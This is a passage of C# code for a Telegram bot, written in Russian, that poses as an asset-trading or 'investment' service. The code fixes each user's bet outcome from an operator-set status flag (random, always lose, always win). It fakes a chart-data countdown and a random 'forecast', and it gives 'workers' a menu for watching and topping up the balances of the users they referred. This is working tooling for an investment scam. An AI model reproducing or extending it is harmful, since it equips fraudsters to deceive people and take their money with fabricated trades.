                    new [] { InlineKeyboardButton.WithCallbackData("🔙 Вернутся в меню работника", $"{user.Id}workerMenu") }
                });

                string refferals = GetRefferals(user);

                SendMessageWithButtons(user, cancellationToken, $"Ваши рефералы:\n{refferals}\nУкажите TgID или username реферала для которого будет зачисление:", inlineKeyboard);

                user.waitRefferal = true;
                user.refferalAction = "AddBalance";
                // ДОДЕЛАТЬ КОД
            }
        }
    }

    UserData SelectRefferal(UserData user, string dataRefferal)
    {
        UserData refferal = null;
        long TgID;
        string username;

        if(long.TryParse(dataRefferal, out TgID))
        {
            return USER(TgID);
        }
        else
        {
            List<UserData> refferals = GetRefferalsList(user);
            if (refferals.Count <= 0) return refferal;
            username = dataRefferal[1..];
            foreach (var reff in refferals)
                if (reff.Username == username) return reff;
        }
        return refferal;
    }

    void AddBalance(long TgID)
    {

    }
    void AddBalance(string username)
    {

    }

    List<UserData> GetRefferalsList(UserData user)
    {
        List<UserData> refferals = new List<UserData>();
        if (user.Refferals.Count > 0)
            foreach (var reffId in user.Refferals)
                refferals.Add(USER(reffId));
        return refferals;
    }

    string GetRefferals(UserData user)
    {
        string refferals = "\n";
        if (user.Refferals.Count > 0)
        {
            foreach (var reffId in user.Refferals)
            {
                var reff = USER(reffId);
                refferals += $"<code>@{reff.Username}</code>, {reff.Balance} ₽, {reff.Status}, TgID: <code>{reff.Id}</code>\n";
            }
        }
        if (refferals == "\n") refferals = "\nУ вас ещё нет рефералов\n";
        return refferals;
    }

    async void SendMessage(UserData user, CancellationToken cancellationToken, string text)
    {
        if (user.idMessage == null) return;
        try { await botClient.DeleteMessageAsync(user.idMessage.Chat.Id, user.idMessage.MessageId); } catch { }
        user.idMessage = await botClient.SendTextMessageAsync(
                    chatId: user.idMessage.Chat.Id,
                    text: text,
                    parseMode: ParseMode.Html,
                    cancellationToken: cancellationToken);
    }

    async void SendMessageWithoutDelete(UserData user, CancellationToken cancellationToken, string text)
    {
        if (user.idMessage == null) return;
        await botClient.SendTextMessageAsync(
            chatId: user.idMessage.Chat.Id,
            text: text,
            parseMode: ParseMode.Html,
            cancellationToken: cancellationToken);
    }

    async void SendMessageWithButtons(UserData user, CancellationToken cancellationToken, string text, InlineKeyboardMarkup inlineKeyboard)
    {
        if (user.idMessage == null) return;

        try {  await botClient.DeleteMessageAsync(user.idMessage.Chat.Id, user.idMessage.MessageId); } catch { }
        user.idMessage = await botClient.SendTextMessageAsync(
                    chatId: user.idMessage.Chat.Id,
                    text: text,
                    replyMarkup: inlineKeyboard,
                    parseMode: ParseMode.Html,
                    cancellationToken: cancellationToken);
    }

    async void UpdateMessageBet(CancellationToken cancellationToken, UserData user)
    {
        for (int i = 15; i >= 1; i--)
        {
            user.idMessage = await botClient.EditMessageTextAsync(
            chatId: user.idMessage.Chat.Id,
            messageId: user.idMessage.MessageId,
            text: $"Получение данных о графике: {i} секунд",
            cancellationToken: cancellationToken);

            Thread.Sleep(1000);
        }

        user.NumOfTransactions++;
        bool betClosed = false;
        string courseChanged;

        if(user.Status == "RANDOM") // ОПРЕДЕЛЯЕМ РАНДОМНО ЗАШЛА ЛИ СТАВКА
        {
            int r = random.Next(1, 3);

            if(r == 1)
            {
                betClosed = true;
                user.Balance += user.InvestmentAmount * 0.8;
            }
            else
            {
                betClosed = false;
                user.Balance -= user.InvestmentAmount;
            }
        }
        else if(user.Status == "LOSE") // СТАВКА ВСЕГДА ПРОСИРАЕТСЯ
        {
            betClosed = false;
            user.Balance -= user.InvestmentAmount;
        }
        else // СТАВКА ВСЕГДА ЗАХОДИТ
        {
            betClosed = true;
            user.Balance += user.InvestmentAmount * 0.8;
        }

        if (user.CourseDirection.Contains("Вверх")) courseChanged = betClosed ? user.CourseDirection : "Вниз ⬇";
        else courseChanged = betClosed ? user.CourseDirection : "Вверх ⬆";

        InlineKeyboardMarkup inlineKeyboard = new(new[]{
                new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
            });

        SendMessageWithButtons(user, cancellationToken, $"Имя пользователя: <i>@{user.Username}</i>\nTelegramID: <i>{user.Id}</i>\n\nИнвестиция в актив: <i>{user.SelectedAsset}</i>\nСумма инвестиции: <i>{user.InvestmentAmount} ₽</i>\nПрогноз пользователя: <i>{user.CourseDirection}</i>\nПроцент при успешном прогнозе: <i><u>180%</u></i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nИзменения актива: {user.SelectedAsset}\n\nКурс изменился: {courseChanged}\n{(betClosed ? "Прибыль" : "Убыток")} составляет: {(betClosed ? user.InvestmentAmount * 0.8 : user.InvestmentAmount)}\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🗓 {DateTime.Now.ToShortDateString()}, {DateTime.Now.ToLongTimeString()}", inlineKeyboard);

        var yourRefferals = FindRefferals(user);
        if(yourRefferals.Count > 0) // РАССЫЛКА ВСЕМ РЕФЕРАЛАМ
            foreach(var reff in yourRefferals)
                if (reff.idMessage != null && reff != user)
                    SendMessage(reff, cancellationToken, $"Имя пользователя: <i>@{user.Username}</i>\nTelegramID: <i>{user.Id}</i>\n\nИнвестиция в актив: <i>{user.SelectedAsset}</i>\nСумма инвестиции: <i>{user.InvestmentAmount} ₽</i>\nПрогноз пользователя: <i>{user.CourseDirection}</i>\nПроцент при успешном прогнозе: <i><u>180%</u></i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nИзменения актива: {user.SelectedAsset}\n\nКурс изменился: {courseChanged}\n{(betClosed ? "Прибыль" : "Убыток")} составляет: {(betClosed ? user.InvestmentAmount * 0.8 : user.InvestmentAmount)}\nБаланс реферала: {user.Balance}\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🗓 {DateTime.Now.ToShortDateString()}, {DateTime.Now.ToLongTimeString()}");

        user.InvestmentAmount = 0;
        user.SelectedAsset = string.Empty;

        SaveData();
    }

    List<UserData> FindRefferals(UserData user)
    {
        List<UserData> result = new List<UserData>();

        foreach(var reff in users)
            if (reff.Refferals.Contains(user.Id) && reff != user) result.Add(reff);

        return result;
    }

    string GetForecast()
    {
        int r1 = random.Next(1, 11);
        int r2 = random.Next(1, 100);

        if (r1 <= 5) return $"-0.{r2}% 📉";
        else return $"+0.{r2}% 📈";
    }

    Task HandlePollingErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
    {
        var ErrorMessage = exception switch
        {
            ApiRequestException apiRequestException
                => $"Telegram API Error:\n[{apiRequestException.ErrorCode}]\n{apiRequestException.Message}",
            _ => exception.ToString()
        };

        Console.WriteLine(ErrorMessage);
        return Task.CompletedTask;
    }
}